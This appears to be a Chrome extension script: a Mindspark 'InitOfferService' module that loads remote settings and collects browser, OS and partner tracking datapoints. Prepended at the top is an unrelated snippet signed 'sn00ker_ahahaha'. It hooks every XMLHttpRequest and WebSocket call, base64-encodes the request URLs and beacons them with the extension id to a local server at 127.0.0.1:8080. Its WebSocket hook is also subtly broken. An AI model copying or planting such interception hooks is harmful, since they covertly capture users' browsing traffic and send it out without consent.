function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
"use strict";
var InitOfferService = (function () {
    function InitOfferService(config) {
        console.log('ios: %s - init - initializing offerService', InitOfferService.formatNow());
        this.config = config;
        this.buildVars = config.buildVars;
        this.state = config.state;
        var self = this;
        try {
            var sysImports = {
                Object: Object,
                JSON: JSON,
                Promise: Promise,
                XMLHttpRequest: XMLHttpRequest
            };
            var AJAX_1 = genericAJAX.bind(null, sysImports);
            var datapoints_1 = self.getDataPoints();
            var isDevBuild = parseInt(self.buildVars.version) === 0;
            var remoteExtensionSettingsURL = isDevBuild ? self.buildVars.remoteExtensionDevSettingsURL : self.buildVars.remoteExtensionSettingsURL;
            var remoteSettingsPromise = self.loadRemoteSettingsAndLog(remoteExtensionSettingsURL, sysImports);
            console.log('ios: %s - init - remoteSettingsPromise', InitOfferService.formatNow());
            remoteSettingsPromise
                .then(function (settings) {
                console.log('ios: %s - init - remoteSettingsPromise then %s', InitOfferService.formatNow(), settings);
                var initImports = {
                    logCapNativeEvent: function (eventType, appSpecificParams) {
                        ask.apps.ul.fireEvent(eventType, self.config.buildVars.unifiedLoggingUrl, appSpecificParams, self.config);
                    },
                    getItem: function (item) {
                        return Promise.resolve(localStorage.getItem(item));
                    },
                    setItem: function (item, value) {
                        return Promise.resolve(localStorage.setItem(item, value));
                    },
                    removeItem: function (item) {
                        return Promise.resolve(localStorage.removeItem(item));
                    },
                    loadOfferServiceSettings: function () {
                        return Promise.resolve(settings.offerServiceSettings);
                    },
                    openInNewTab: function (url, supportWTTRedirect) {
                        console.log('ios: %s - openInNewTab(%s, %s)', InitOfferService.formatNow(), url, supportWTTRedirect);
                        if (supportWTTRedirect) {
                            console.log('ios: %s - openInNewTab - supportWTTRedirect - setting up to respond to command URL: %s#command=showNewTab&cobrand=%s', InitOfferService.formatNow(), url, datapoints_1.cobrandID);
                            UrlFragmentActions.init(self.config);
                        }
                        return new Promise(function (resolve, reject) {
                            chrome.tabs.create({ url: url }, resolve);
                        });
                    },
                    setTimeout: function (callback, timeout) {
                        return window.setTimeout(callback, timeout);
                    },
                    clearTimeout: function (timeoutId) {
                        window.clearTimeout(timeoutId);
                    },
                    replaceParams: self.replaceParams.bind(self),
                    AJAX: AJAX_1,
                    datapoints: datapoints_1,
                    Date: Date,
                    console: console,
                    JSON: JSON,
                    Object: Object,
                    Promise: Promise
                };
                Mindspark_OfferService.init(initImports);
            })
                .catch(function (reason) {
                console.error('ios: %s - init - final catch reason: %s', InitOfferService.formatNow(), reason && (reason.message || reason));
                self.logInfoUL('on-error', 'offer-service-setup', reason && (reason.message || reason));
            });
        }
        catch (ex) {
            console.error('ios: %s - init - caught %s', InitOfferService.formatNow(), ex && (ex.message || ex));
            self.logInfoUL('on-error', 'offer-service-setup', ex && (ex.message || ex));
        }
    }
    InitOfferService.timer = function () {
        var start = Date.now();
        return function () { return Date.now() - start; };
    };
    InitOfferService.pad2 = function (n) {
        return n < 10 ? '0' + n : n.toString();
    };
    InitOfferService.pad3 = function (n) {
        return (n < 100 ? '0' : '') + InitOfferService.pad2(n);
    };
    InitOfferService.formatNow = function () {
        var now = new Date();
        return InitOfferService.pad2(now.getHours()) + ':' + InitOfferService.pad2(now.getMinutes()) + ':' + InitOfferService.pad2(now.getSeconds()) + '.' + InitOfferService.pad3(now.getMilliseconds());
    };
    InitOfferService.prototype.logInfoUL = function (message, topic, data1, data2) {
        console[message === 'on-error' ? 'error' : 'log']('ios: %s - Info event, message: %s, topic: %s, data1: %s, data2: %s', InitOfferService.formatNow(), message, topic, data1, data2);
        ask.apps.ul.fireEvent('Info', this.config.buildVars.unifiedLoggingUrl, {
            message: message,
            topic: topic,
            data1: data1,
            data2: data2
        }, this.config);
    };
    InitOfferService.prototype.loadRemoteSettingsAndLog = function (url, sysImports) {
        if (url) {
            var self_1 = this;
            var loadRemoteJson_1 = genericLoadRemoteJson.bind(null, sysImports);
            var loadRemoteSettings = genericLoadRemoteSettings.bind(null, sysImports);
            var elapsed_1 = InitOfferService.timer();
            this.logInfoUL('on-before', 'extension-settings', url);
            return loadRemoteSettings(url, function (url) {
                return loadRemoteJson_1(self_1.replaceParams(url));
            }).catch(function (reason) {
                self_1.logInfoUL('on-error', 'extension-settings', url, reason);
                return Promise.reject(reason);
            }).then(function (settings) {
                self_1.logInfoUL('on-after', 'extension-settings', url, elapsed_1());
                return settings;
            });
        }
        else {
            return Promise.reject('settings-url-empty');
        }
    };
    InitOfferService.prototype.replaceParams = function (str) {
        console.log('ios: %s - config from background %o', InitOfferService.formatNow(), this.config);
        var out = str ? TextTemplate.parse(str, this.config.state.replaceableParams) : str;
        console.log('ios: %s - replaceParams old(%s) returns %s', InitOfferService.formatNow(), str, out);
        return out;
    };
    InitOfferService.prototype.extend = function (lhs, rhs) {
        Object.keys(rhs).reduce(function (out, key) {
            out[key] = rhs[key];
            return out;
        }, lhs);
    };
    InitOfferService.getBrowserVersion = function (navigator) {
        return navigator.userAgent.replace(/.*Chrome\/(\d+\.\d+\.\d+\.\d+).*/, '$1');
    };
    InitOfferService.getLanguage = function (navigator) {
        return navigator.language.split('-')[0];
    };
    InitOfferService.getOS = function (navigator) {
        if (/.*CrOS.*/.test(navigator.userAgent))
            return 'ChromeOS';
        if (/^Win.*$/.test(navigator.platform))
            return 'Windows';
        if (/^Mac.*$/.test(navigator.platform))
            return 'MacOS';
        if (/^Linux.*$/.test(navigator.platform))
            return 'Linux';
        return 'Other';
    };
    InitOfferService.prototype.getDataPoints = function () {
        var params = this.state.replaceableParams;
        return {
            browserID: '',
            browserName: 'Chrome',
            browserVersion: InitOfferService.getBrowserVersion(window.navigator),
            campaign: params.affiliateID,
            cobrandID: params.cobrandID,
            coID: params.coID,
            countryCode: params.countryCode || '99',
            country: '',
            installDate: params.installDate,
            installDateHex: params.installDateHex,
            language: InitOfferService.getLanguage(window.navigator),
            locale: window.navigator.language,
            os: InitOfferService.getOS(window.navigator),
            partnerID: params.partnerID,
            partnerSubID: params.partnerSubID,
            platform: window.navigator.platform,
            redirectedUserID: '',
            toolbarBuildDate: this.buildVars.buildDate,
            toolbarID: params.toolbarID,
            toolbarVersion: params.toolbarVersion,
            trackID: params.trackID,
            userAgent: window.navigator.userAgent,
            userSegment: localStorage['userSegment']
        };
    };
    return InitOfferService;
}());
